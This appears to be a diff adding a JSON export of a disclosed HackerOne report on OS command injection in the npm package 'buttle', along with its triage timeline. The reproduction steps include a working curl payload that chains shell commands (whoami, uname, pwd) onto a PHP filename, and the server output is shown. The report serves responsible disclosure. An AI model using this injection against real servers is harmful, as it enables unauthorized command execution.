@@ -1,0 +1,354 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "kapytein", 
+        "babayaga_", 
+        "0x08", 
+        "mq22q"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 331032, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-05-11T15:52:05.607Z", 
+    "vulnerability_information": "I would like to report Remote Code Execution in buttle module.\n\nWhen buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.\n\n# Module\n\n**module name:** buttle\n**version:** 0.2.0\n**npm page:** https://www.npmjs.com/package/buttle\n\n## Module Description\n\nSimple static file (+ markdown) server.\n\n\n## Module Stats\n\nStats:\n\nN/A, estimated ~20-40 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nWhen buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:\n\n```javascript\n// ./node_modules/buttle/lib/mid-php.js, line 15\n\n    var phpFile = norm(join(docroot, req.url));\n    fs.exists(phpFile, function(exists) {\n    if(exists) {\n        res.setHeader('Content-Type', 'text/html');\n\n        var cp = require('child_process').spawn(phpBin, [phpFile]);\n\n        cp.stdout.on('data', function(data) {\n        res.write(data);\n        });\n\n        cp.stderr.on('data', function(data) {\n        res.write(data);\n        });\n\n        cp.on('close', function() {\n        res.end('');\n        });\n\n    } else {\n```\n\nAs you can notice, ```spawn()``` method is called with PHP file as an argument, but no sanitization is apllied on ```phpFile``` variable. Using ```curl```, I was able to pass example PHP filename concatenated with ```;[shell cmd]``` string, which allows me to execute command on the server.\n\n\n## Steps To Reproduce:\n\n- install ```buttle```:\n\n```\n$ npm i buttle\n```\n\n- create ```test.php``` file with folloing content:\n\n```php\n<?php\necho 'Its working!';\n?>\n\n```\n\n- run buttle with PHP support:\n\n```\n$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php\nListening on port 8080\n```\n\n- execute following command in the console:\n\n```\n$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo \"uh oh, RCE :P\"\n```\n\n- see response from the server containing results of execution of injected commands:\n\n```\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n> GET /test.php HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html\n< Date: Thu, 29 Mar 2018 10:35:22 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n* Connection #0 to host localhost left intact\nIts working!rafal.janicki\nLinux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n/home/rafal.janicki/playground/hackerone/Node\nuh oh, RCE :P\n```\n\n\n## Patch\n\n```phpFile``` variable should be sanitized. Ideally, it should strip everything what comes after ```.php``` extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)\n\n## Supporting Material/References:\n\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl v. 7.47.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI hope my report will help to keep Node.js ecosystem and its users safe :)\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker is able to execute commands on remote server where buttler with --php-bin flag is run.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 10.0, 
+        "author_type": "Team"
+    }, 
+    "title": "[buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag", 
+    "is_member_of_team?": null, 
+    "vote_count": 4, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "buttle", 
+        "max_severity": "critical", 
+        "databaseId": 8249, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-06-10T15:52:05.724Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T22:15:08.966Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T22:15:08.966Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2592780, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T22:15:39.340Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T22:15:39.340Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @bl4de,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n", 
+            "markdown_message": "<p>Hi <a href=\"/bl4de\">@bl4de</a>,</p>\n\n<p>Thanks for reporting this issue.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2592784, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T22:16:35.411Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T22:16:35.411Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (10.0)", 
+                "old_severity": "High"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2592787, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-04-11T22:19:28.708Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T22:19:28.708Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "buttle", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2592788, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-24T19:34:11.139Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-24T19:34:11.139Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "No response yet from the author. The repository too has stale issues dating back to 2017 and the project is largely unmaintained. \n\nWill disclose the report if no progress made by the author to join this conversation.", 
+            "markdown_message": "<p>No response yet from the author. The repository too has stale issues dating back to 2017 and the project is largely unmaintained. </p>\n\n<p>Will disclose the report if no progress made by the author to join this conversation.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2661085, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2018-05-11T15:51:42.618Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-11T15:51:42.618Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2729762, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-11T15:52:05.684Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-11T15:52:05.684Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2729766, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-11T15:52:15.452Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-11T15:52:15.452Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ManuallyDisclosed", 
+            "id": 2729768, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-11T15:53:40.508Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-11T15:53:40.508Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (10.0)", 
+                "old_severity": "Critical (10.0)"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2729772, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 59, 
+        "name": "OS Command Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -15489123.395175504, 
+    "disclosed_at": "2018-05-11T15:52:15.524Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/331032", 
+    "created_at": "2018-03-29T10:43:09.761Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>I would like to report Remote Code Execution in buttle module.</p>\n\n<p>When buttle is run with <code>--php-bin</code> option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.</p>\n\n<h1 id=\"module\">Module</h1>\n\n<p><strong>module name:</strong> buttle<br>\n<strong>version:</strong> 0.2.0<br>\n<strong>npm page:</strong> <a title=\"https://www.npmjs.com/package/buttle\" href=\"/redirect?signature=c494be4b25443a8a51deacb6d7f9f2b218f69c65&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbuttle\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/buttle</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"module-description\">Module Description</h2>\n\n<p>Simple static file (+ markdown) server.</p>\n\n<h2 id=\"module-stats\">Module Stats</h2>\n\n<p>Stats:</p>\n\n<p>N/A, estimated ~20-40 downloads/week</p>\n\n<h1 id=\"vulnerability\">Vulnerability</h1>\n\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n\n<p>When buttle is run with <code>--php-bin</code> option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// ./node_modules/buttle/lib/mid-php.js, line 15</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">phpFile</span> <span class=\"o\">=</span> <span class=\"nx\">norm</span><span class=\"p\">(</span><span class=\"nx\">join</span><span class=\"p\">(</span><span class=\"nx\">docroot</span><span class=\"p\">,</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">));</span>\n    <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">exists</span><span class=\"p\">(</span><span class=\"nx\">phpFile</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">exists</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">exists</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">setHeader</span><span class=\"p\">(</span><span class=\"s1\">&#39;Content-Type&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;text/html&#39;</span><span class=\"p\">);</span>\n\n        <span class=\"kd\">var</span> <span class=\"nx\">cp</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;child_process&#39;</span><span class=\"p\">).</span><span class=\"nx\">spawn</span><span class=\"p\">(</span><span class=\"nx\">phpBin</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"nx\">phpFile</span><span class=\"p\">]);</span>\n\n        <span class=\"nx\">cp</span><span class=\"p\">.</span><span class=\"nx\">stdout</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">&#39;data&#39;</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n        <span class=\"p\">});</span>\n\n        <span class=\"nx\">cp</span><span class=\"p\">.</span><span class=\"nx\">stderr</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">&#39;data&#39;</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n        <span class=\"p\">});</span>\n\n        <span class=\"nx\">cp</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">&#39;close&#39;</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">end</span><span class=\"p\">(</span><span class=\"s1\">&#39;&#39;</span><span class=\"p\">);</span>\n        <span class=\"p\">});</span>\n\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n</code></pre>\n<p>As you can notice, <code>spawn()</code> method is called with PHP file as an argument, but no sanitization is apllied on <code>phpFile</code> variable. Using <code>curl</code>, I was able to pass example PHP filename concatenated with <code>;[shell cmd]</code> string, which allows me to execute command on the server.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>buttle</code>:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm i buttle\n</code></pre>\n<ul>\n<li>create <code>test.php</code> file with folloing content:</li>\n</ul>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span>\n<span class=\"k\">echo</span> <span class=\"s1\">&#39;Its working!&#39;</span><span class=\"p\">;</span>\n<span class=\"cp\">?&gt;</span>\n\n</code></pre>\n<ul>\n<li>run buttle with PHP support:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php\nListening on port 8080\n</code></pre>\n<ul>\n<li>execute following command in the console:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo &quot;uh oh, RCE :P&quot;\n</code></pre>\n<ul>\n<li>see response from the server containing results of execution of injected commands:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n&gt; GET /test.php HTTP/1.1\n&gt; Host: localhost:8080\n&gt; User-Agent: curl/7.47.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 200 OK\n&lt; Content-Type: text/html\n&lt; Date: Thu, 29 Mar 2018 10:35:22 GMT\n&lt; Connection: keep-alive\n&lt; Transfer-Encoding: chunked\n&lt; \n* Connection #0 to host localhost left intact\nIts working!rafal.janicki\nLinux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n/home/rafal.janicki/playground/hackerone/Node\nuh oh, RCE :P\n</code></pre>\n<h2 id=\"patch\">Patch</h2>\n\n<p><code>phpFile</code> variable should be sanitized. Ideally, it should strip everything what comes after <code>.php</code> extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>Operating system: Ubuntu 16.04</li>\n<li>Node.js 8.9.4</li>\n<li>npm v. 5.6.0</li>\n<li>curl v. 7.47.0</li>\n</ul>\n\n<h1 id=\"wrap-up\">Wrap up</h1>\n\n<ul>\n<li>I contacted the maintainer to let them know: [N] </li>\n<li>I opened an issue in the related repository: [N] </li>\n</ul>\n\n<p>I hope my report will help to keep Node.js ecosystem and its users safe :)</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker is able to execute commands on remote server where buttler with --php-bin flag is run.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
